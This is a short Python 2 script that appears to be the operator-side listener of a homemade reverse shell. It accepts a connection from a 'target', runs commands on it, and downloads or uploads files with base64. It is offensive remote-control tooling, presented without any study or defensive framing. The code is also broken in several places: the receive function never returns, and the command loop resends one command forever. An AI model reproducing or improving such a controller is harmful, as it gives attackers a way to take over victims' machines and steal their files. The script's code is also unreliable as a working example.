#!/usr/bin/python
import socket
import json
import base64

#This fun. allow us to send large bytes of data
def relaible_send(data):
	global json_data
	json_data=json.dumps(data).encode('utf-8')
	target.send(json_data)

#This fun. allow us to recieve large bytes of data
def relaible_recv():
	json_data=""
	while True:
		try:
			json_data=json_data+str(target.recv(1024))
			print(json.loads(json_data))
		except ValueError:
			continue

#This fun. allow us to execute commands on the client/reverse shell
def shell():
	command=raw_input("#~"+str(ip))
	while True:
		relaible_send(command)
		if command=='q':
			break

		elif command[:2]=='cd' and len(command)>1:
			continue

		elif command[:8]=='download':
			with open(command[9:],'wb') as file:
				result=relaible_recv()
				file.write(base64.b64decode(result))

		elif command[:6]=='upload':
			with open(command[7:],'rb') as fin:
				try:
					relaible_send(base64.b64encode(fin.read()))
				except:
					failed="Failed to upload the file"
					relaible_send(base64.b64encode(failed))

		else:
			result=relaible_recv()
			print(result)

#This fun. allow us to connect to the client/reverse shell
def server():
	global s
	global ip
	global target
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(("<ip addr>",54321))
	s.listen(5)
	print("Listening for incoming connections...")
	target,ip=s.accept()
	print("Target Connected!")

server()
shell()
s.close()
